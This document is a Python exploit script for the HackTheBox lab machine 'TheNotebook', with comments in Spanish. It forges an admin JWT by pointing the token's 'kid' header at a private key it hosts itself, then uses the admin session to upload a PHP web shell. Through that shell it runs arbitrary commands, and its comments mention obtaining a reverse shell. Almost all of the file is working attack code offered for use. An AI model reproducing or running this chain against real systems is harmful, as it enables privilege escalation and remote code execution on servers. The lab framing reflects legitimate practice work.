#!/usr/bin/python3 

# Programa creado para hacer un cookie-hijacking y a su vez subir archivos como ese usuario (Arbitrary File Upload).
## Subiremos un archivo .php para ejecutar comandos en el sistema (RCE).
### By. lanzf

import argparse, signal, subprocess, sys
import requests, base64, jwt, re, json
from pwn import *

# -- CTRL + C
def def_handler(sig, frame):
    print(Color.RED + "\n[-] Saliendo...\n" + Color.END)
    exit(1)
 
signal.signal(signal.SIGINT, def_handler)

# -- Clases
class Color:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

class BienMal:
    DONE = Color.GREEN + "✔" + Color.END
    FAIL = Color.RED + "✘" + Color.END

# -- Variables globales
url = "http://10.10.10.230"
banner = base64.b64decode("4pWT4pSA4pSA4pWW4pWTICDilZbilZPilIDilIAg4pWT4pWWIOKVpeKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgCDilZPilIDilIDilZbilZPilIDilIDilZbilZPilIDilIDilZbilZMgIOKVliAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK4pWZIOKVkeKVnOKVkSAg4pWr4pWRICAg4pWR4pWRIOKVkeKVkSAg4pWR4pWZIOKVkeKVnOKVkSAgIOKVkeKUgOKUgOKVnOKVkSAg4pWR4pWRICDilZHilZHilIDilIDilZwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAg4pWRIOKVq+KUgOKUgOKVq+KVq+KUgOKUgCDilZHilasg4pWR4pWrICDilZEgIOKVkSDilavilIDilIAg4pWr4pSA4pSA4pWW4pWrICDilZHilasgIOKVkeKVq+KUgOKUgOKVliAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIOKUgOKVqCDilaggIOKVqOKVmeKUgOKUgOKUgOKVqOKVmeKUgOKVnOKVmeKUgOKUgOKVnCDilIDilagg4pWZ4pSA4pSA4pSA4pWo4pSA4pSA4pWc4pWZ4pSA4pSA4pWc4pWZ4pSA4pSA4pWc4pWoICDilZzigKIgYnkgbGFueiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCkdlbmVyYXRlOiBKV1QsIFByaXZhdGUgS2V5IGFuZCBSQ0Ugd2l0aCBQSFAgZmlsZS4K").decode()

print("\n" + Color.BLUE + banner + Color.END)

# -- Funciones
def arguments():
    parse = argparse.ArgumentParser(description=Color.BLUE + 'Cookie-Hijacking - RCE upload PHP file - HackTheBox TheNotebook' + Color.END)
    parse.add_argument('-l', dest='lhost', type=str, help='* IP Address where is hosted the private key file')
    parse.add_argument('-p', dest='web_port', type=int, help='* Port where is hosted the private key file')
    parse.add_argument('-U', dest='username', type=str, default="lanz", help='Username to create account, default: lanz')
    parse.add_argument('-P', dest='password', type=str, default="lanz321", help='Password to create account, default: lanz321')
    parse.add_argument('-e', dest='email', type=str, default="lanz@lanz.htb", help='Email to create account, default: lanz@lanz.htb')
    parse.add_argument('-c', dest='command', type=str, default="id", help='Command to execute, default: id')
    args = parse.parse_args()

    if args.lhost is None or args.web_port is None:
        print("[+] El programa generará varias cositas, entre ellas:")
        print("\t* Creará la llave privada y el token JWT.")
        print("\t* Levatará un servidor web por pocos segundos.")
        print("\t* Ejecutará comandos en el sistema.\n")
        print(Color.YELLOW + "[!] Ejemplo de uso: %s -l 10.10.123.123 -p 8000\n" % (sys.argv[0]) + Color.END)
        exit(1)

    return args

# --- Creamos cuenta en el portal web e iniciamos sesión
def register_acc(username, password, email):
    p1 = log.progress("Ingresando al sitio web")

    # La sesión con la que jugaremos en todo el programa
    session = requests.Session()

    data_post = {
        "username" : username,
        "password" : password,
        "email" : email
    }
    try:
        r = session.post(url + "/register", data=data_post, timeout=3)
    except requests.exceptions.Timeout:
        print(Color.RED + "\n[-] Revisa tu conexión contra la máquina.\n" + Color.END)
        p1.failure(BienMal.FAIL)
        exit(1)

    r = session.post(url + "/login", data={"username": username, "password": password})
    if "Welcome back! %s" % (username) not in r.text:
        print(Color.RED + "\n[-] Valida tus credenciales, cambialas si es necesario!\n")
        print(Color.RED + "\n[-] Pueda que ya este creado el usuario con el que intentas...\n")
        p1.failure(BienMal.FAIL)
        exit(1)

    p1.success(BienMal.DONE)

    return session

# --- Generamos llave y JSON Web Token
def convert_JWT(lhost, web_port, username, email, p3):
    # Levantamos servidor web por pocos segundos
    web_background = subprocess.Popen(["timeout", "7", "python3", "-m", "http.server", str(web_port)])
    # Generamos RSA key
    keyfile = "privKey.key"
    output_command = subprocess.check_output("openssl genrsa 4096 > %s" % (keyfile), shell=True, stderr=subprocess.STDOUT)

    # JSON Web Token
    # - Header
    header_json = {
        "typ":"JWT",
        "alg":"RS256",
        "kid":"http://%s:%d/%s" % (lhost, web_port, keyfile)
    }
    # - Payload (data)
    payload_json = {
        "username":username,
        "email":email,
        "admin_cap":"true"
    }
    # - Extraemos el contenido de la llave privada
    with open(keyfile, 'rb') as content_keyfile:
        try:
            token_jwt = jwt.encode(payload_json, content_keyfile.read(), algorithm="RS256", headers=header_json)
            p3.status(BienMal.DONE)
        except Exception as e:
            p3.failure(BienMal.FAIL + str(e))
            exit(1)

    return token_jwt, p3

# --- Creamos el token JWT para acceder con permisos de administrador a la web y subimos archivo para ejecutar comandos en el sistema
def upload_file(session, lhost, web_port, username, email, command):
    p3 = log.progress("Generando JSON Web Token")

    # Generamos llave y JSON Web Token
    token_admin, p3 = convert_JWT(lhost, web_port, username, email, p3)

    # Cambiamos nuestra cookie auth por una como administradores
    session.cookies.set('auth', token_admin, domain='10.10.10.230', path='/')

    # Validamos que somos admins
    r = session.get(url)
    if "Admin Panel" in r.text:
        p3.success(BienMal.DONE)
    else:
        print(Color.RED + "\n[-] Problemas al volvernos administradores, intenta de nuevo!\n" + Color.END)
        p3.failure(BienMal.FAIL)
        exit(1)

    # -- Subimos archivo PHP que nos permitira ejecutar comandos en la máquina
    p4 = log.progress("Subiendo .php malicioso")

    data_file = [
            ('file',
                ('hola.php', "<?php $coma=shell_exec($_GET['xmd']); echo $coma; ?>", 'application/x-php'))]
    r = session.post(url + "/admin/upload", files=data_file)

    p4.success(BienMal.DONE)

    file_uploaded = re.findall(r'href="/(.*?)"', r.text)[7]

    # -- Ejecutamos el comando usando el archivo subido (si es una reverse shell, ponte en escucha)
    execommand(command, file_uploaded)

def execommand(command, file_uploaded):
    p5 = log.progress("Ejecutando " + Color.PURPLE + command + Color.END + " en el sistema")
    try:
        r = session.get(url + '/' + file_uploaded, params={"xmd":command}, timeout=3)

        p5.success(Color.YELLOW + "\n\n" + r.text + Color.END)
    except requests.exceptions.Timeout:
        # Por si quieres obtener una reverse shell, asi evitamos que la web se quede con la conexión abierta, apenas pasen 3 segundos la cierra
        p5.status("Generando reverse shell, espera un momento...")
        time.sleep(2)

        p5.success(BienMal.DONE)

# -- Inicio del programa
if __name__ == '__main__':
    args = arguments()

    session = register_acc(args.username, args.password, args.email)
    upload_file(session, args.lhost, args.web_port, args.username, args.email, args.command)

    print(Color.GREEN + "[+] A seguir rompiendo todo...\n" + Color.END)
